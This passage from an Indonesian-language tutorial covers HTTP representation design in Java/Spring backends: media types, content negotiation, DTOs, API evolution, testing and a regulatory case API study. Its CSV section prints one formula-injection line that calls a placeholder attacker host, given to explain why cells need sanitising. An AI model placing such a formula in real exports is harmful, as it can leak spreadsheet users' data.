```

Response:

```http
Content-Type: application/x-ndjson
```

Body:

```json
{"eventId":"E-1","type":"CASE_CREATED"}
{"eventId":"E-2","type":"CASE_ASSIGNED"}
```

Important WebFlux notes:

- jangan block event loop;
- jangan collect large stream ke memory;
- perhatikan backpressure;
- perhatikan DataBuffer leak;
- perhatikan codec max in-memory size;
- streaming representation harus cocok dengan proxy behavior.

---

## 14. XML, CSV, PDF, NDJSON, and Binary Representation

### 14.1 XML

XML masih sering ada di enterprise/regulatory integration.

Kelebihan:

- schema validation mature;
- namespace support;
- document-centric;
- existing government/enterprise standards.

Risiko:

- XXE;
- entity expansion;
- parser configuration;
- namespace complexity;
- verbose payload.

Jika menerima XML:

- disable external entity;
- validate size;
- define schema;
- test malicious input;
- do not expose internal object graph.

### 14.2 CSV

CSV cocok untuk export tabular.

Poin penting:

- delimiter;
- escaping;
- charset;
- header row;
- formula injection risk;
- large export streaming;
- localization of numeric/date;
- stable column names.

Formula injection example:

```csv
name,comment
Alice,=IMPORTXML("http://attacker")
```

Jika CSV dibuka di spreadsheet, formula bisa dieksekusi. Backend harus sanitize cell yang diawali `=`, `+`, `-`, `@` sesuai risk policy.

### 14.3 PDF

PDF cocok untuk:

- official report;
- audit document;
- printable record;
- regulatory notice;
- signed document.

Poin penting:

- deterministic rendering;
- template version;
- font handling;
- localization;
- timestamp;
- document hash;
- digital signature;
- storage vs on-demand generation;
- content-disposition;
- access control.

### 14.4 NDJSON

NDJSON cocok untuk streaming event/export besar.

Contoh:

```http
Content-Type: application/x-ndjson
```

```json
{"caseId":"C-1","status":"OPEN"}
{"caseId":"C-2","status":"CLOSED"}
```

Kelebihan:

- streaming-friendly;
- tidak perlu menunggu array selesai;
- memory efficient;
- line-by-line processing.

Kekurangan:

- client harus mendukung streaming parser;
- error handling mid-stream sulit;
- proxy buffering bisa mengganggu.

### 14.5 Binary/octet-stream

Gunakan:

```http
Content-Type: application/octet-stream
```

untuk binary generic.

Tetapi jika format diketahui, lebih baik spesifik:

```http
Content-Type: application/pdf
Content-Type: image/png
Content-Type: application/zip
```

---

## 15. Compression and Representation

Compression bukan representation format, tetapi encoding terhadap bytes representation.

JSON asli:

```http
Content-Type: application/json
```

Compressed JSON:

```http
Content-Type: application/json
Content-Encoding: gzip
```

Backend concerns:

1. Jangan compress file yang sudah compressed seperti JPEG/ZIP/PDF tertentu kecuali terbukti bermanfaat.
2. Hindari compress response sangat kecil.
3. Perhatikan CPU overhead.
4. Hindari double compression jika proxy sudah compress.
5. Hati-hati dengan secrets dalam compressed response untuk browser context.
6. Pastikan observability membedakan compressed size vs uncompressed size.

---

## 16. Representation Evolution

### 16.1 Additive changes biasanya aman

Menambah field response biasanya non-breaking jika client ignore unknown fields.

V1:

```json
{
  "caseId": "C-1",
  "status": "UNDER_REVIEW"
}
```

V1 plus additive field:

```json
{
  "caseId": "C-1",
  "status": "UNDER_REVIEW",
  "priority": "HIGH"
}
```

Tetapi ini hanya aman jika client tidak melakukan strict deserialization yang gagal pada unknown fields.

### 16.2 Removing field adalah breaking

Menghapus field:

```json
{
  "caseId": "C-1"
}
```

Jika sebelumnya client bergantung pada `status`, ini breaking.

### 16.3 Changing type adalah breaking

Sebelumnya:

```json
{
  "riskScore": 87
}
```

Menjadi:

```json
{
  "riskScore": "HIGH"
}
```

Breaking.

Lebih baik additive:

```json
{
  "riskScore": 87,
  "riskLevel": "HIGH"
}
```

Lalu deprecate field lama.

### 16.4 Changing meaning juga breaking

Sebelumnya:

```json
{
  "daysOpen": 5
}
```

Artinya calendar days.

Kemudian diubah menjadi business days tanpa field rename. Ini breaking secara semantic walaupun schema sama.

Lebih baik:

```json
{
  "calendarDaysOpen": 5,
  "businessDaysOpen": 3
}
```

### 16.5 Enum addition can be breaking

Menambah enum value sering dianggap non-breaking oleh server, tetapi breaking bagi client strict.

Mitigasi:

- dokumentasikan unknown enum policy;
- sediakan category;
- gunakan feature negotiation;
- gunakan versioning jika value baru mengubah workflow besar.

### 16.6 Deprecation metadata

Dalam response, bisa beri metadata:

```http
Deprecation: true
Sunset: Wed, 31 Dec 2026 23:59:59 GMT
Link: <https://api.example.com/docs/migrations/case-v1-to-v2>; rel="deprecation"
```

Atau dalam documentation/changelog.

---

## 17. Schema and Contract Documentation

Representation contract harus bisa diuji dan didokumentasikan.

Tools/patterns:

- OpenAPI;
- JSON Schema;
- AsyncAPI untuk event stream;
- example-based documentation;
- consumer-driven contract testing;
- snapshot contract tests;
- schema compatibility checks;
- mock server.

OpenAPI contoh ringkas:

```yaml
CaseResponse:
  type: object
  required:
    - caseId
    - status
    - createdAt
  properties:
    caseId:
      type: string
      example: C-2026-00091
    status:
      type: string
      enum:
        - SUBMITTED
        - UNDER_REVIEW
        - CLOSED
    createdAt:
      type: string
      format: date-time
```

Poin penting:

- schema harus mencerminkan real behavior;
- example harus valid;
- error response juga didokumentasikan;
- enum evolution harus dijelaskan;
- nullable harus eksplisit;
- additionalProperties policy harus jelas.

---

## 18. Representation Testing Strategy

### 18.1 Unit test mapping

Test mapping domain ke response DTO.

```java
@Test
void mapsInternalStatusesToPublicUnderReview() {
    CaseEntity entity = new CaseEntity();
    entity.setStatus(CaseStatus.LEGAL_PENDING);

    CaseResponse response = mapper.toResponse(entity, Locale.ENGLISH);

    assertThat(response.status()).isEqualTo("UNDER_REVIEW");
}
```

### 18.2 Serialization test

Pastikan JSON shape stabil.

```java
@Test
void serializesCaseResponseAsExpected() throws Exception {
    CaseResponse response = new CaseResponse(
        "C-1",
        "UNDER_REVIEW",
        "Under review",
        OffsetDateTime.parse("2026-06-18T09:30:00+07:00"),
        OffsetDateTime.parse("2026-06-18T10:00:00+07:00"),
        Map.of("self", "/cases/C-1")
    );

    String json = objectMapper.writeValueAsString(response);

    assertThat(json).contains("\"caseId\":\"C-1\"");
    assertThat(json).contains("\"status\":\"UNDER_REVIEW\"");
}
```

### 18.3 Controller content negotiation test

```java
@Test
void returnsJsonWhenAcceptJson() throws Exception {
    mockMvc.perform(get("/cases/C-1")
            .accept(MediaType.APPLICATION_JSON))
        .andExpect(status().isOk())
        .andExpect(header().string(HttpHeaders.CONTENT_TYPE, startsWith("application/json")))
        .andExpect(jsonPath("$.caseId").value("C-1"));
}
```

### 18.4 Unsupported media type test

```java
@Test
void rejectsXmlRequestWhenOnlyJsonSupported() throws Exception {
    mockMvc.perform(post("/cases")
            .contentType(MediaType.APPLICATION_XML)
            .accept(MediaType.APPLICATION_JSON)
            .content("<case></case>"))
        .andExpect(status().isUnsupportedMediaType());
}
```

### 18.5 Not acceptable test

```java
@Test
void rejectsPdfAcceptWhenEndpointOnlyProducesJson() throws Exception {
    mockMvc.perform(get("/cases/C-1")
            .accept(MediaType.APPLICATION_PDF))
        .andExpect(status().isNotAcceptable());
}
```

### 18.6 Security serialization test

```java
@Test
void doesNotExposeInternalRiskScore() throws Exception {
    mockMvc.perform(get("/cases/C-1")
            .accept(MediaType.APPLICATION_JSON))
        .andExpect(status().isOk())
        .andExpect(jsonPath("$.internalRiskScore").doesNotExist())
        .andExpect(jsonPath("$.encryptedRespondentTaxId").doesNotExist());
}
```

---

## 19. Case Study: Regulatory Enforcement Case API

### 19.1 Requirement

Kita punya backend untuk enforcement lifecycle.

Client berbeda:

1. Internal investigator portal.
2. Supervisor dashboard.
3. External respondent portal.
4. Reporting/export system.
5. Inter-agency integration.

Resource:

```http
/cases/{caseId}
```

### 19.2 Same resource, different representations

#### Internal investigator JSON

```http
GET /cases/C-2026-00091
Accept: application/json
Authorization: Bearer investigator-token
```

```json
{
  "caseId": "C-2026-00091",
  "status": "UNDER_REVIEW",
  "priority": "HIGH",
  "assignedUnit": {
    "unitId": "U-LEGAL",
    "name": "Legal Review"
  },
  "respondent": {
    "respondentId": "R-10291",
    "displayName": "PT Example"
  },
  "risk": {
    "level": "HIGH",
    "reasonCodes": ["REPEAT_OFFENDER", "HIGH_VALUE_TRANSACTION"]
  },
  "links": {
    "self": "/cases/C-2026-00091",
    "evidence": "/cases/C-2026-00091/evidence",
    "timeline": "/cases/C-2026-00091/timeline",
    "escalations": "/cases/C-2026-00091/escalations"
  }
}
```

#### External respondent JSON

```http
GET /cases/C-2026-00091
Accept: application/json
Authorization: Bearer respondent-token
```

```json
{
  "caseId": "C-2026-00091",
  "status": "UNDER_REVIEW",
  "respondent": {
    "respondentId": "R-10291",
    "displayName": "PT Example"
  },
  "notices": [
    {
      "noticeId": "N-100",
      "type": "REQUEST_FOR_INFORMATION",
      "issuedAt": "2026-06-18T09:30:00+07:00",
      "dueAt": "2026-06-25T17:00:00+07:00"
    }
  ],
  "links": {
    "self": "/cases/C-2026-00091",
    "notices": "/cases/C-2026-00091/notices"
  }
}
```

Risk fields are omitted.

#### PDF official report

```http
GET /cases/C-2026-00091/report
Accept: application/pdf
```

```http
HTTP/1.1 200 OK
Content-Type: application/pdf
Content-Disposition: attachment; filename="case-C-2026-00091-report.pdf"
Cache-Control: private, no-store
```

#### CSV export

```http
GET /cases/export?status=UNDER_REVIEW
Accept: text/csv
```

```http
HTTP/1.1 200 OK
Content-Type: text/csv; charset=utf-8
Content-Disposition: attachment; filename="cases-under-review-2026-06-18.csv"
```

### 19.3 Design decisions

| Concern | Decision |
|---|---|
| Public case ID | String, not database UUID |
| Internal risk score | Internal-only representation |
| Status | Public enum with stable category |
| PDF report | Separate URI because report is a distinct generated artifact |
| CSV export | Collection/export representation |
| Sensitive response | `Cache-Control: private, no-store` |
| Language | Human labels localized; machine values stable |
| Audit | Template version and generated timestamp included in PDF metadata |
| Authorization | Different DTOs per audience |

---

## 20. Common Anti-Patterns

### Anti-pattern 1: Returning entity directly

```java
return caseRepository.findById(id).get();
```

Impact:

- data leakage;
- circular JSON;
- unstable API;
- lazy loading issue;
- coupling persistence to external contract.

### Anti-pattern 2: One DTO for every context

```text
CaseDto used by admin, investigator, respondent, export, mobile, webhook.
```

Impact:

- field explosion;
- authorization risk;
- null confusion;
- poor performance;
- client confusion.

### Anti-pattern 3: Ignoring `Accept`

Client requests PDF, server returns JSON without explanation.

Impact:

- broken integration;
- confusing debugging;
- poor protocol behavior.

### Anti-pattern 4: Wrong `Content-Type`

```http
Content-Type: text/plain

{"caseId":"C-1"}
```

Impact:

- client parser mismatch;
- security sniffing risk;
- gateway policy failure.

### Anti-pattern 5: Localized machine values

```json
{
  "status": "Sedang Ditinjau"
}
```

Impact:

- client logic depends on language;
- impossible stable automation;
- reporting breaks.

### Anti-pattern 6: Ambiguous dates

```json
{
  "dueDate": "06/07/2026"
}
```

Impact:

- locale ambiguity;
- legal/audit dispute;
- integration failure.

### Anti-pattern 7: Leaking internal workflow

```json
{
  "status": "L2_REVIEW_WAITING_ON_LEGAL_QUEUE_RETRY_3"
}
```

Impact:

- client coupled to internal process;
- internal refactor becomes breaking change;
- exposes operational detail.

### Anti-pattern 8: Error response has different shape per exception

```json
{"error":"bad request"}
```

```json
{"message":"validation failed","fields":[]}
```

```json
{"timestamp":"...","status":500,"trace":"..."}
```

Impact:

- client error handling fragile;
- observability inconsistent;
- security risk.

---

## 21. Practical Design Framework

Saat mendesain representation, jawab pertanyaan ini.

### 21.1 Identity

- Apa identifier publiknya?
- Apakah identifier internal boleh bocor?
- Apakah ID aman untuk URL/log?
- Apakah ID stabil lintas migration?

### 21.2 Audience

- Siapa client-nya?
- Apakah response sama untuk semua role?
- Apakah field-level authorization dibutuhkan?
- Apakah representation bisa masuk cache?

### 21.3 Shape

- Apakah response item, collection, command result, export, stream, atau error?
- Apakah perlu envelope?
- Apakah perlu links?
- Apakah perlu metadata?

### 21.4 Semantics

- Apa arti setiap field?
- Apakah field derived?
- Apakah field localized?
- Apakah field server-owned?
- Apakah enum bisa bertambah?

### 21.5 Compatibility

- Field mana boleh ditambah?
- Field mana deprecated?
- Bagaimana unknown field policy?
- Bagaimana versioning?

### 21.6 HTTP metadata

- Apa `Content-Type`?
- Apa `Cache-Control`?
- Apa `ETag`?
- Apakah perlu `Vary`?
- Apakah perlu `Content-Disposition`?
- Apakah response compressed?

### 21.7 Security

- Apakah ada field sensitif?
- Apakah response tergantung authorization?
- Apakah request bisa mass assignment?
- Apakah file name/header aman?
- Apakah XML/CSV/PDF punya attack surface?

---

## 22. Backend Checklist

Gunakan checklist ini saat review API.

### 22.1 Request checklist

- [ ] Endpoint mendeklarasikan `consumes` dengan jelas.
- [ ] Unsupported request media type menghasilkan `415`.
- [ ] Malformed body menghasilkan error konsisten.
- [ ] Request DTO tidak sama dengan entity.
- [ ] Server-owned fields tidak diterima dari client.
- [ ] Unknown field policy jelas.
- [ ] Date/time parsing timezone-aware.
- [ ] Numeric precision aman.
- [ ] Enum validation jelas.
- [ ] Partial update semantics jelas.

### 22.2 Response checklist

- [ ] Endpoint mendeklarasikan `produces` dengan jelas.
- [ ] Response punya `Content-Type` benar.
- [ ] Unsupported `Accept` ditangani konsisten.
- [ ] Response DTO tidak membocorkan internal data.
- [ ] Field semantics terdokumentasi.
- [ ] Null/missing/empty policy konsisten.
- [ ] Date/time format stabil.
- [ ] Machine values tidak localized.
- [ ] Collection response evolvable.
- [ ] Error response shape konsisten.

### 22.3 Negotiation/cache checklist

- [ ] Jika representation bervariasi berdasarkan `Accept`, kirim `Vary: Accept`.
- [ ] Jika bervariasi berdasarkan language, kirim `Vary: Accept-Language`.
- [ ] Jika bervariasi berdasarkan authorization, hindari shared cache atau gunakan cache policy aman.
- [ ] ETag sesuai selected representation.
- [ ] Compression policy jelas.
- [ ] File download memakai `Content-Disposition` aman.

### 22.4 Java/Spring checklist

- [ ] Gunakan DTO/record eksplisit.
- [ ] Jangan return JPA entity langsung.
- [ ] Gunakan `consumes`/`produces` untuk endpoint penting.
- [ ] Konfigurasi Jackson date/time.
- [ ] Tentukan unknown property behavior.
- [ ] Test serialization shape.
- [ ] Test 406/415 behavior.
- [ ] Test sensitive field tidak keluar.
- [ ] Test role-specific representation.

---

## 23. Exercises

### Exercise 1 — Design representation

Desain response JSON untuk:

```http
GET /cases/{caseId}
```

Dengan audience:

1. Investigator.
2. Respondent external.
3. Supervisor.

Tentukan:

- field bersama;
- field role-specific;
- field yang tidak boleh bocor;
- cache policy;
- DTO terpisah atau satu DTO dengan filtering.

### Exercise 2 — Content negotiation

Sebuah endpoint mendukung JSON dan PDF:

```http
GET /cases/{caseId}/report
```

Tentukan response untuk:

```http
Accept: application/json
```

```http
Accept: application/pdf
```

```http
Accept: application/xml
```

Jelaskan status code, `Content-Type`, dan `Vary`.

### Exercise 3 — Request DTO hardening

Client mengirim:

```json
{
  "subject": "Unauthorized activity",
  "description": "Potential violation",
  "status": "APPROVED",
  "createdBy": "admin",
  "priority": "HIGH"
}
```

Untuk endpoint:

```http
POST /cases
```

Tentukan:

- field mana valid;
- field mana server-owned;
- apakah unknown/forbidden field direject atau ignored;
- bentuk error response.

### Exercise 4 — Evolution

Response V1:

```json
{
  "caseId": "C-1",
  "status": "UNDER_REVIEW",
  "daysOpen": 5
}
```

Requirement baru:

- bedakan calendar days dan business days;
- tampilkan SLA due date;
- status baru `LEGAL_ESCALATION_PENDING`.

Desain perubahan yang paling backward-compatible.

---

## 24. Summary

Part ini membangun pemahaman bahwa backend HTTP tidak sekadar return object sebagai JSON.

Mental model utama:

1. **Resource bukan representation.** URI menunjuk resource; response body adalah representation.
2. **Representation adalah public contract.** Jangan bocorkan entity/persistence model.
3. **`Content-Type` dan `Accept` berbeda.** `Content-Type` menjelaskan body yang dikirim; `Accept` menyatakan response yang diinginkan.
4. **Media type penting.** JSON, problem+json, PDF, CSV, NDJSON, XML punya semantics dan risk masing-masing.
5. **DTO adalah boundary.** Request DTO, command, domain model, response DTO harus dipisahkan di sistem serius.
6. **Representation bisa berbeda berdasarkan audience.** Authorization memengaruhi field dan shape, bukan hanya access/no access.
7. **Caching bergantung pada selected representation.** Gunakan `Vary`, ETag, dan cache policy dengan benar.
8. **Evolution harus dirancang.** Menambah field biasanya aman; menghapus, mengubah tipe, atau mengubah arti adalah breaking.
9. **Spring punya mekanisme negotiation.** `consumes`, `produces`, converter/codec, Jackson config, dan tests harus dipahami.
10. **Top-tier backend design memperlakukan representation sebagai produk jangka panjang.**

---

## 25. What Comes Next

Part berikutnya:

```text
learn-http-for-web-backend-perspective-part-009.md
```

Judul:

```text
Validation, Parsing, and Defensive Boundaries
```

Kita akan masuk lebih dalam ke:

- syntax validation vs semantic validation;
- structural validation;
- Bean Validation;
- null vs missing;
- date/time parsing;
- enum evolution;
- unknown fields;
- validation error model;
- placement validation di controller/application/domain;
- defensive parsing sebagai security boundary.

Status seri setelah part ini:

```text
Part 008 dari 032 selesai.
Seri belum selesai.
```

<!-- NAVIGATION_FOOTER -->
<div class="page-nav">
<a href="./learn-http-for-web-backend-perspective-part-007.md">⬅️ Part 007 — URI, Routing, and Resource Modeling</a>
<a href="./index.md">📚 Kategori</a>
<a href="../../../index.md">🏠 Home</a>
<a href="./learn-http-for-web-backend-perspective-part-009.md">Part 009 — Validation, Parsing, and Defensive Boundaries ➡️</a>
</div>
